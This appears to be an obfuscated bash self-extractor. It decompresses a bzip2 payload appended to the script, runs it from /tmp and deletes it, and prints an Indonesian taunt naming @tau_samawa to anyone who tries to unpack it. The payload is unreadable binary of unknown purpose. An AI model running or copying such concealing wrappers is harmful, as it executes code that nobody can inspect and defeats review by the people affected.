#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�n� O��p1 ���?'ݎ����`x�g�Tm�5[`�� b*~�=C!�2d�@  @q��LML�M2C@h2h`��#L���0�d���d��	�0�5�Q��6�jM ���=@hh zA��j�S���6�4j6�4�2`� 1��$H  Ѐ��S���ѵ=M�oT��!���:����?�C���S�S�_��/�kŜX������b�AV؈iC@�	(����	�uqF��7�C��d���.�n���	+	����3N ���v�f�06!A,$�C7���v/����{o�����e���-�a��`���J8"��[/�-X�m�G&��LZpD������,������[۰�e7�t��O������f,��ۓ���5?:�~V6b[��ɘ�+�� %�\��Mg���j���n��ZD� 8L<�~m�м�d�� �V�����u~�����)T�"M�+hN�k�w�#nVȷ���߲=�	����f``��B�.Rsհ��vk/�/�G�*�Ytո�nK4L��Fǐ��� �Bf�f���m2�=�	�Okt�CJ�4 T�Cn��Xm�ij������#�N+�.;	�4ԏ ��"M��4�w���ӻ��*c��S��N��iBg�,OLT�a��c�$مQ���ph0;V�Jv���?n(�y�e�c�,7�4d�
221Y����b*�[[�D���_rl
�.&��9�Sp�`	<�AB�HX5�/d7�me�6-���KT)�%�����q�	�H�H���$�:.�ҁD�>g�D��o�����e��h����e����m���ԙ�y�>�a��h�R�h�h�$�8�s��&l��*����Oi��b�!��!�0���2T�����L����ߑjƊu�%��U;!�u�-X���~�]�Sw2�1�s�6[�����?,�j�a�T�!�8����!��SL0+��4����o`ڎ	ԏ$S����2�Ɛ��dq�"蒠rA�ig0�@Khv5�&#f�%mے@�8VDJ�J�"�qE)�_����0T\*K V~�1�L������H�Gz7_2���򨋧� 0SsX�F�]OP�#)��tA% ��j`���[aa�V�6J��(@ְ���C�{dx>�������h���D�7�މu��7 ��;C��Ws�=$[S��`�L��0Y{�E��|��3�$#AP�M<Q���>R�1��S�5/C�ad}o�;B��U�BF���oR.'��!��3�G�S"����E(^ؿ���\z*@H�;�$ ����c��ưMi�x��z�TbD����t|�Pr�#ےӘ��n{fŕX"�)k�������TCu��Pv���ڞ��N�u�F����)�4�I~�!��4���_sIU�@Y�p5���DhYO�F14��=���9��a�t�C
}��t=[-	���%�1M`n��׉Q;<E�Kٸ��ɶ+(`��R��&��V�ӟH0�^�v@��Ň�n����+l7�B%9	.�\��hg���R��1;�)Nc�ͼ���;zn�1�\�Ŝ�*�*1���O�K��@�]�j��A� G��
�0�Y��\s)K��:�(��.�1NwŸ�5�9"b�Q�����I���ˊ#i���j+�ɣ�Z��!��{[�9$�o�J�z�ap���U�Q��p)˸�N +�3;3Ϥ�z����d�]��D���(�ˀ�H����8�ѠH���4������H�
�M� 